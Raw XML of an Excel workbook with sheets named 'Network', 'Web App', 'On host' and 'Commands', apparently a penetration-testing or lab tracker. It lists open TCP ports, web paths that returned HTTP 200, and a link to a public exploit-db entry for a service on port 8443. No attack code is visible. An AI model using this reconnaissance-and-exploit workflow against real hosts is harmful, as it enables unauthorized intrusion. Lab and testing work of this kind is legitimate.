      <c r="I10" s="2" t="s">
        <v>59</v>
      </c>
    </row>
    <row r="11" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A11" s="1" t="s">
        <v>94</v>
      </c>
      <c r="B11" s="2" t="s">
        <v>55</v>
      </c>
      <c r="C11" s="2" t="s">
        <v>56</v>
      </c>
      <c r="D11" s="2" t="s">
        <v>23</v>
      </c>
      <c r="E11" s="6" t="str">
        <f t="shared" si="0"/>
        <v>80</v>
      </c>
      <c r="F11" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G11" s="4" t="s">
        <v>41</v>
      </c>
      <c r="H11" s="2" t="s">
        <v>73</v>
      </c>
      <c r="I11" s="4" t="s">
        <v>72</v>
      </c>
      <c r="J11" s="5" t="s">
        <v>71</v>
      </c>
    </row>
    <row r="12" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A12" s="2" t="s">
        <v>94</v>
      </c>
      <c r="B12" s="2" t="s">
        <v>55</v>
      </c>
      <c r="C12" s="2" t="s">
        <v>56</v>
      </c>
      <c r="D12" s="2" t="s">
        <v>34</v>
      </c>
      <c r="E12" s="6" t="str">
        <f t="shared" si="0"/>
        <v>6699</v>
      </c>
      <c r="F12" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G12" s="2" t="s">
        <v>46</v>
      </c>
      <c r="H12" s="2" t="s">
        <v>61</v>
      </c>
    </row>
    <row r="13" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A13" s="1" t="s">
        <v>94</v>
      </c>
      <c r="B13" s="2" t="s">
        <v>55</v>
      </c>
      <c r="C13" s="2" t="s">
        <v>56</v>
      </c>
      <c r="D13" s="2" t="s">
        <v>35</v>
      </c>
      <c r="E13" s="6" t="str">
        <f t="shared" si="0"/>
        <v>6063</v>
      </c>
      <c r="F13" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G13" s="2" t="s">
        <v>45</v>
      </c>
    </row>
    <row r="14" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A14" s="2" t="s">
        <v>94</v>
      </c>
      <c r="B14" s="2" t="s">
        <v>55</v>
      </c>
      <c r="C14" s="2" t="s">
        <v>56</v>
      </c>
      <c r="D14" s="2" t="s">
        <v>36</v>
      </c>
      <c r="E14" s="6" t="str">
        <f t="shared" si="0"/>
        <v>49665</v>
      </c>
      <c r="F14" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G14" s="2" t="s">
        <v>50</v>
      </c>
    </row>
    <row r="15" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A15" s="1" t="s">
        <v>94</v>
      </c>
      <c r="B15" s="2" t="s">
        <v>55</v>
      </c>
      <c r="C15" s="2" t="s">
        <v>56</v>
      </c>
      <c r="D15" s="2" t="s">
        <v>37</v>
      </c>
      <c r="E15" s="6" t="str">
        <f t="shared" si="0"/>
        <v>49666</v>
      </c>
      <c r="F15" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G15" s="2" t="s">
        <v>51</v>
      </c>
    </row>
    <row r="16" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A16" s="2" t="s">
        <v>94</v>
      </c>
      <c r="B16" s="2" t="s">
        <v>55</v>
      </c>
      <c r="C16" s="2" t="s">
        <v>56</v>
      </c>
      <c r="D16" s="2" t="s">
        <v>38</v>
      </c>
      <c r="E16" s="6" t="str">
        <f t="shared" si="0"/>
        <v>8443</v>
      </c>
      <c r="F16" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G16" s="2" t="s">
        <v>58</v>
      </c>
      <c r="H16" s="2" t="s">
        <v>86</v>
      </c>
      <c r="I16" s="4" t="s">
        <v>85</v>
      </c>
      <c r="J16" s="5" t="s">
        <v>84</v>
      </c>
    </row>
    <row r="17" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A17" s="1" t="s">
        <v>94</v>
      </c>
      <c r="B17" s="2" t="s">
        <v>55</v>
      </c>
      <c r="C17" s="2" t="s">
        <v>56</v>
      </c>
      <c r="D17" s="2" t="s">
        <v>39</v>
      </c>
      <c r="E17" s="6" t="str">
        <f t="shared" si="0"/>
        <v>445</v>
      </c>
      <c r="F17" s="7" t="str">
        <f t="shared" si="1"/>
        <v>tcp</v>
      </c>
      <c r="G17" s="2" t="s">
        <v>44</v>
      </c>
      <c r="H17" s="2" t="s">
        <v>62</v>
      </c>
    </row>
    <row r="18" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A18" s="1"/>
      <c r="E18" s="6"/>
      <c r="F18" s="7"/>
    </row>
    <row r="19" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A19" s="1"/>
      <c r="E19" s="6"/>
      <c r="F19" s="7"/>
    </row>
    <row r="20" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A20" s="1"/>
      <c r="E20" s="6"/>
      <c r="F20" s="7"/>
    </row>
    <row r="21" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A21" s="1"/>
      <c r="E21" s="6"/>
      <c r="F21" s="7"/>
    </row>
    <row r="22" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A22" s="1"/>
      <c r="E22" s="6"/>
      <c r="F22" s="7"/>
    </row>
    <row r="23" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A23" s="1"/>
      <c r="E23" s="6"/>
      <c r="F23" s="7"/>
    </row>
    <row r="24" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E24" s="6"/>
      <c r="F24" s="7"/>
    </row>
    <row r="25" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E25" s="6"/>
      <c r="F25" s="7"/>
    </row>
    <row r="26" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A26" s="1"/>
      <c r="E26" s="6"/>
      <c r="F26" s="7"/>
    </row>
    <row r="27" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E27" s="6"/>
      <c r="F27" s="7"/>
    </row>
    <row r="28" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A28" s="1"/>
      <c r="E28" s="6"/>
      <c r="F28" s="7"/>
    </row>
  </sheetData>
  <sortState xmlns:xlrd2="http://schemas.microsoft.com/office/spreadsheetml/2017/richdata2" ref="A2:K29">
    <sortCondition ref="F2:F29"/>
    <sortCondition ref="E2:E29"/>
  </sortState>
  <phoneticPr fontId="3" type="noConversion"/>
  <hyperlinks>
    <hyperlink ref="J11" r:id="rId1" xr:uid="{CF2D8A9A-2FD5-47A5-A5BC-A164A2B7DD00}"/>
    <hyperlink ref="J16" r:id="rId2" xr:uid="{4F76863E-6870-46CB-BDDC-A06A3A2F2971}"/>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H24"/>
  <sheetViews>
    <sheetView zoomScale="78" zoomScaleNormal="78" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="C1" sqref="C1"/>
      <selection pane="bottomLeft" activeCell="B16" sqref="B16"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="29.77734375" style="2" customWidth="1"/>
    <col min="2" max="2" width="39.109375" style="2" customWidth="1"/>
    <col min="3" max="3" width="18.5546875" style="2" customWidth="1"/>
    <col min="4" max="4" width="34.33203125" style="2" customWidth="1"/>
    <col min="5" max="6" width="64" style="2" customWidth="1"/>
    <col min="7" max="7" width="22.88671875" style="2" customWidth="1"/>
    <col min="8" max="8" width="49.44140625" style="2" customWidth="1"/>
    <col min="9" max="16384" width="8.88671875" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:8" s="4" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>7</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>17</v>
      </c>
      <c r="C1" s="4" t="s">
        <v>16</v>
      </c>
      <c r="D1" s="4" t="s">
        <v>8</v>
      </c>
      <c r="E1" s="4" t="s">
        <v>5</v>
      </c>
      <c r="F1" s="4" t="s">
        <v>21</v>
      </c>
      <c r="G1" s="4" t="s">
        <v>10</v>
      </c>
      <c r="H1" s="4" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="2" spans="1:8" s="4" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="1" t="s">
        <v>70</v>
      </c>
      <c r="B2" s="2" t="s">
        <v>65</v>
      </c>
      <c r="C2" s="2" t="str">
        <f>LEFT($B2,FIND("/",$B2)-1)</f>
        <v xml:space="preserve">200 </v>
      </c>
      <c r="D2" s="2" t="str">
        <f>MID($B2,FIND("/",$B2)+1,LEN($B2))</f>
        <v>%3f/</v>
      </c>
      <c r="E2" s="2"/>
      <c r="F2" s="2"/>
    </row>
    <row r="3" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="1" t="s">
        <v>70</v>
      </c>
      <c r="B3" s="2" t="s">
        <v>66</v>
      </c>
      <c r="C3" s="2" t="str">
        <f t="shared" ref="C3:C5" si="0">LEFT($B3,FIND("/",$B3)-1)</f>
        <v xml:space="preserve">200 </v>
      </c>
      <c r="D3" s="2" t="str">
        <f t="shared" ref="D3:D5" si="1">MID($B3,FIND("/",$B3)+1,LEN($B3))</f>
        <v>favicon.ico</v>
      </c>
      <c r="G3" s="5"/>
    </row>
    <row r="4" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="1" t="s">
        <v>70</v>
      </c>
      <c r="B4" s="2" t="s">
        <v>67</v>
      </c>
      <c r="C4" s="2" t="str">
        <f t="shared" si="0"/>
        <v xml:space="preserve">200 </v>
      </c>
      <c r="D4" s="2" t="str">
        <f t="shared" si="1"/>
        <v>index.htm</v>
      </c>
    </row>
    <row r="5" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="1" t="s">
        <v>69</v>
      </c>
      <c r="B5" s="2" t="s">
        <v>68</v>
      </c>
      <c r="C5" s="2" t="str">
        <f t="shared" si="0"/>
        <v xml:space="preserve">200 </v>
      </c>
      <c r="D5" s="2" t="str">
        <f t="shared" si="1"/>
        <v xml:space="preserve">index.html    </v>
      </c>
      <c r="E5" s="1"/>
    </row>
    <row r="6" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="E6" s="1"/>
      <c r="F6" s="4"/>
    </row>
    <row r="8" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="D8" s="4"/>
    </row>
    <row r="9" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="D9" s="4"/>
    </row>
    <row r="10" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="D10" s="4"/>
      <c r="F10" s="5"/>
    </row>
    <row r="11" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="D11" s="4"/>
    </row>
    <row r="12" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="D12" s="4"/>
    </row>
    <row r="13" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="D13" s="4"/>
    </row>
    <row r="14" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="D14" s="4"/>
    </row>
    <row r="15" spans="1:8" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="D15" s="4"/>
    </row>
    <row r="24" spans="7:7" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="G24" s="5"/>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4"/>
  <sheetViews>
    <sheetView topLeftCell="E1" zoomScale="69" zoomScaleNormal="69" workbookViewId="0">
      <pane ySplit="1" topLeftCell="A2" activePane="bottomLeft" state="frozen"/>
      <selection activeCell="B1" sqref="B1"/>
      <selection pane="bottomLeft" activeCell="H22" sqref="H22"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="16.109375" style="2" customWidth="1"/>
    <col min="2" max="2" width="12.109375" style="2" customWidth="1"/>
    <col min="3" max="3" width="10.44140625" style="2" customWidth="1"/>
    <col min="4" max="4" width="11.5546875" style="2" customWidth="1"/>
    <col min="5" max="5" width="17.6640625" style="2" bestFit="1" customWidth="1"/>
    <col min="6" max="6" width="85.6640625" style="2" customWidth="1"/>
    <col min="7" max="7" width="25.109375" style="2" customWidth="1"/>
    <col min="8" max="8" width="69.44140625" style="2" customWidth="1"/>
    <col min="9" max="9" width="33.44140625" style="2" customWidth="1"/>
    <col min="10" max="10" width="77.88671875" style="2" customWidth="1"/>
    <col min="11" max="11" width="52.44140625" style="2" customWidth="1"/>
    <col min="12" max="16384" width="8.88671875" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:11" s="4" customFormat="1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>11</v>
      </c>
      <c r="B1" s="4" t="s">
        <v>4</v>
      </c>
      <c r="C1" s="4" t="s">
        <v>2</v>
      </c>
      <c r="D1" s="4" t="s">
        <v>3</v>
      </c>
      <c r="E1" s="4" t="s">
        <v>12</v>
      </c>
      <c r="F1" s="4" t="s">
        <v>13</v>
      </c>
      <c r="G1" s="4" t="s">
        <v>14</v>
      </c>
      <c r="H1" s="4" t="s">
        <v>5</v>
      </c>
      <c r="I1" s="4" t="s">
        <v>10</v>
      </c>
      <c r="J1" s="3" t="s">
        <v>21</v>
      </c>
      <c r="K1" s="4" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="2" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="1" t="s">
        <v>94</v>
      </c>
      <c r="E2" s="2" t="s">
        <v>77</v>
      </c>
      <c r="F2" s="2" t="s">
        <v>78</v>
      </c>
      <c r="G2" s="2" t="s">
        <v>79</v>
      </c>
      <c r="H2" s="2" t="s">
        <v>80</v>
      </c>
      <c r="J2" s="4" t="s">
        <v>76</v>
      </c>
    </row>
    <row r="3" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="1" t="s">
        <v>94</v>
      </c>
      <c r="B3" s="2" t="s">
        <v>87</v>
      </c>
      <c r="C3" s="2">
        <v>8443</v>
      </c>
      <c r="D3" s="2" t="s">
        <v>88</v>
      </c>
      <c r="E3" s="1" t="s">
        <v>77</v>
      </c>
      <c r="H3" s="2" t="s">
        <v>92</v>
      </c>
      <c r="I3" s="5" t="s">
        <v>91</v>
      </c>
      <c r="J3" s="4" t="s">
        <v>93</v>
      </c>
    </row>
    <row r="4" spans="1:11" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="1"/>
    </row>
  </sheetData>
  <phoneticPr fontId="3" type="noConversion"/>
  <hyperlinks>
    <hyperlink ref="I3" r:id="rId1" display="https://www.exploit-db.com/exploits/46802" xr:uid="{E91A6715-B4D3-42C9-9062-46E7D42B697A}"/>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A24"/>
  <sheetViews>
    <sheetView zoomScale="80" zoomScaleNormal="80" workbookViewId="0">
      <selection activeCell="B9" sqref="B9"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="118.88671875" style="8" bestFit="1" customWidth="1"/>
    <col min="2" max="16384" width="8.88671875" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4" t="s">
        <v>6</v>
      </c>
    </row>
    <row r="2" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A2" s="2" t="s">
        <v>95</v>
      </c>
    </row>
    <row r="3" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A3" s="2" t="s">
        <v>96</v>
      </c>
    </row>
    <row r="4" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A4" s="8" t="s">
        <v>20</v>
      </c>
    </row>
    <row r="5" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A5" s="8" t="s">
        <v>19</v>
      </c>
    </row>
    <row r="6" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A6" s="8" t="s">
        <v>24</v>
      </c>
    </row>
    <row r="7" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A7" s="2" t="s">
        <v>97</v>
      </c>
    </row>
    <row r="8" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A8" s="8" t="s">
        <v>98</v>
      </c>
    </row>
    <row r="9" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A9" s="8" t="s">
        <v>99</v>
      </c>
    </row>
    <row r="10" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A10" s="8" t="s">
        <v>57</v>
      </c>
    </row>
    <row r="11" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A11" s="8" t="s">
        <v>100</v>
      </c>
    </row>
    <row r="12" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A12" s="8" t="s">
        <v>101</v>
      </c>
    </row>
    <row r="13" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A13" s="8" t="s">
        <v>63</v>
      </c>
    </row>
    <row r="14" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A14" s="8" t="s">
        <v>64</v>
      </c>
    </row>
    <row r="15" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A15" s="8" t="s">
        <v>102</v>
      </c>
    </row>
    <row r="16" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A16" s="8" t="s">
        <v>82</v>
      </c>
    </row>
    <row r="17" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A17" s="8" t="s">
        <v>83</v>
      </c>
    </row>
    <row r="18" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A18" s="8" t="s">
        <v>104</v>
      </c>
    </row>
    <row r="19" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A19" s="8" t="s">
        <v>105</v>
      </c>
    </row>
    <row r="20" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A20" s="8" t="s">
        <v>81</v>
      </c>
    </row>
    <row r="21" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A21" s="8" t="s">
        <v>103</v>
      </c>
    </row>
    <row r="22" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A22" s="8" t="s">
        <v>89</v>
      </c>
    </row>
    <row r="23" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A23" s="8" t="s">
        <v>90</v>
      </c>
    </row>
    <row r="24" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A24" s="8" t="s">
        <v>106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FEE-C3BA-4A05-9783-1ED877C22A62}">
  <dimension ref="A1"/>
  <sheetViews>
    <sheetView workbookViewId="0">
      <selection activeCell="A25" sqref="A25"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" customHeight="1" x14ac:dyDescent="0.3"/>
  <cols>
    <col min="1" max="1" width="80.88671875" style="2" bestFit="1" customWidth="1"/>
    <col min="2" max="16384" width="8.88671875" style="2"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:1" ht="15" customHeight="1" x14ac:dyDescent="0.3">
      <c r="A1" s="4"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Network</vt:lpstr>
      <vt:lpstr>Web App</vt:lpstr>
      <vt:lpstr>On host</vt:lpstr>
      <vt:lpstr>Commands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2026-06-23T12:52:04Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-06-27T16:19:21Z</dcterms:modified>
</cp:coreProperties>
</file>